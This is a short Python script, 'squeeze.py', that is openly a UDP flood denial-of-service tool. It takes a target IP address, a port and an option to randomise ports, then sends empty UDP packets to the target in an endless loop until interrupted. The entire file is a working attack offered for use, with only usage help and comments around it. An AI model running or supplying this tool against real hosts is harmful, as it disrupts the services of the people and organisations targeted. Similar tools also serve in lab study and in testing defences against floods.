from socket import *
import sys
import random



#display guide for syntax + arguments 
if sys.argv[1] == "-h":
	print("Syntax: squeeze.py ip port randomise?\n Where ip = target ip, port = target port and randomise? = 't' for randomise target port and 'f' for supplied port")
	sys.exit()

#error if too many/ few arguments
if len(sys.argv) != 4:
	print("Incorrect usage: use squeeze.py -h for help")
	sys.exit()

	
	
#define target ip, port and whether randomised ports true, via command line arguments
ip = str(sys.argv[1])
port = int(sys.argv[2])
ran = sys.argv[3]

#blank string to send in packet
message = ""



#non-random flood attack
def flood():
	print("Flooding " + ip + ", on port " + str(port) + "... Ctrl+C to stop")
	#initiates udp socket
	s = socket(AF_INET, SOCK_DGRAM)
	
	#loops until interrupt, sends udp packet on supplied port to target
	while True:
		try: 
			s.sendto(message.encode(), (ip, port))
		except KeyboardInterrupt:
			print("\nExiting...")
			sys.exit()

#randomised flood attack
def ran_flood():
	print("Flooding " + ip + ", randomising ports... Ctrl+C to stop")
	#initiates udp socket
	s = socket(AF_INET, SOCK_DGRAM)

	#loops until interrupt, sends udp packet on random port to target
	while True:
		try: 
			port = random.randint(1, 65535)
			s.sendto(message.encode(), (ip, port))
		except KeyboardInterrupt:
			print("\nExiting...")
			sys.exit()



if ran == "f":
	flood()

elif ran == "t":
	ran_flood()

else:
	print("Incorrect argument: use squeeze.py -h for help")
